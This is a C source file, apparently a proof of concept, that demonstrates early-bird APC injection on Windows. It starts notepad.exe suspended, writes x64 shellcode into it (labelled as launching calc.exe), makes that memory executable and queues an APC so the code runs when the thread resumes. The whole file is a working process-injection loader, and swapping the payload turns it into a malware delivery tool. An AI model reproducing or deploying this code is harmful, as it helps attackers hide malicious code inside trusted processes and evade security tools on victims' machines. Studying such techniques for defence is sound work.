#include <windows.h>
#include <stdio.h>

// calc.exe shellcode (x64)
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79"
"\x73\x74\x65\x6d\x33\x32\x5c\x63\x61\x6c\x63\x2e\x65\x78"
"\x65\x00";

int main() {

    // STEP 1: Create suspended Notepad process
    STARTUPINFOA Si = { 0 };
    PROCESS_INFORMATION Pi = { 0 };
    Si.cb = sizeof(STARTUPINFOA);

    if (!CreateProcessA(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE,
        CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)) {
        printf("[!] CreateProcessA Failed: %d\n", GetLastError());
        return 1;
    }

    HANDLE hProcess = Pi.hProcess;
    HANDLE hThread = Pi.hThread;

    printf("[+] Created suspended Notepad (PID: %d)\n", Pi.dwProcessId);

    // STEP 2: Allocate memory and inject shellcode
    PVOID pRemoteAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteAddress == NULL) {
        printf("[!] VirtualAllocEx Failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return 1;
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pRemoteAddress, shellcode, sizeof(shellcode), &bytesWritten)) {
        printf("[!] WriteProcessMemory Failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return 1;
    }

    DWORD dwOldProtection = 0;
    if (!VirtualProtectEx(hProcess, pRemoteAddress, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtectEx Failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return 1;
    }

    printf("[+] Shellcode injected at 0x%p\n", pRemoteAddress);


    // STEP 3: Early bird
    if (!QueueUserAPC((PAPCFUNC)pRemoteAddress, hThread, 0)) {
        printf("\t[!] QueueUserAPC Failed With Error : %d \n", GetLastError());
        return 1;
    }
    ResumeThread(hThread);

    printf("[+] Thread hijacked! Calculator should pop up!\n");
    printf("[/] Press Enter to clean up...\n");
    getchar();

    // Cleanup
    VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    CloseHandle(hThread);

    return 0;
}